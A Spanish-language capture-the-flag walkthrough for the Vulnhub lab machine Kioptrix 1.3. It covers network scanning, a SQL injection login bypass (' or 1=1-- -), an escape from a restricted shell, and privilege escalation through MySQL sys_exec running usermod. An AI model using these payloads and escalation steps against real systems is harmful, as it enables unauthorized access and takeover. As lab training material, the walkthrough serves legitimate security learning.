<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=F7F400&width=390&height=80&lines=KIOPTRIX_1.3"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/kioptrix-level-13-4,25/

<h1 align="center"></h1>

</br>

- *Paso 1:* Identificar la IP de la máquina host con Arp-Scan. 
```
arp-scan --interface eth0 -l
```
![1](https://user-images.githubusercontent.com/75953873/178128766-c1eb1f99-56e6-4449-a3f2-bf9345a59492.png)

IP host: `192.168.25.138`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.25.138
```
![2](https://user-images.githubusercontent.com/75953873/178128792-82993633-dc3c-4167-ab2c-4e0c05570d37.png)

Puertos abiertos: [22,80,139,445]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 22,80,139,445 -A 192.168.25.138
```
![3](https://user-images.githubusercontent.com/75953873/178128892-5d15426d-7724-4b96-ac14-8fa749662bc6.png)

![3 2](https://user-images.githubusercontent.com/75953873/178128937-364e11ba-8b5a-475b-a4c3-f5713ebe4d66.png)

Servidor corriendo: **HTTP Apache**

O.S: **Linux**

URL: `http://192.168.25.138`

![4](https://user-images.githubusercontent.com/75953873/178128981-b955ab0e-8efa-4d7b-a4a2-9ab170f6c50c.png)

La enumeración de directorios y archivos con Dirb encuentra un directorio llamado `john`, pero esté no revela nada relevante.
```
dirb http://192.168.25.138
```
![5](https://user-images.githubusercontent.com/75953873/178129062-4b519854-bfa5-469c-82a6-346010347a17.png)

![6](https://user-images.githubusercontent.com/75953873/178129075-842d66d2-e997-45c6-8cce-84d712f3c0db.png)

- *Paso 4:* Inyección SQL manual.

En el panel de login se debe ingresar el usuario `john` y la contraseña `' or 1=1-- -`.

![7](https://user-images.githubusercontent.com/75953873/178129163-cf68f241-8cbb-4d11-ac2a-50263173b630.png)

- *Paso 5:* Conectarse al servidor SSH.
```
ssh -oHostKeyAlgorithms=+ssh-dss john@192.168.25.138 -l john
```

Usuario: `john`

Contraseña: `MyNameIsJohn`

![8](https://user-images.githubusercontent.com/75953873/178129218-e0862b3b-4d30-44b2-8352-cc0e39f5d10c.png)

La shell se ejecuta dentro de un intérprete de python por lo que saldremos de ella e ingresaremos al directorio raíz del servidor `/var/www`:
```
echo os.system('/bin/bash')
cd /www/var
cat checklogin.php
```
![9](https://user-images.githubusercontent.com/75953873/178129470-0903b88c-271e-4874-90a4-5fbcef300f1a.png)

- *Paso 5:* Iniciar sesión en el servidor MySQL.

Usuario: `root`

Contraseña: **sin contraseña**
```
mysql -u root -p
```
![10](https://user-images.githubusercontent.com/75953873/178129574-e42549f2-88dd-4a2b-8824-7bdce7f93d08.png)

El comando `usermod` otorgará a `john` al grupo de administradores (root).
```
select sys_exec('usermod -a -G admin john');
```
![11](https://user-images.githubusercontent.com/75953873/178129692-b62b22bc-5e6f-4611-8276-a9b38b75d4c7.png)

Por último, ejecutar `sudo su` para obtener una shell con privilegios e ingresar al directorio `/root`. La contraseña del root es la misma del servidor SSH.

![12](https://user-images.githubusercontent.com/75953873/178129723-9535e1cd-4441-4040-ae77-0711a3d604c0.png)
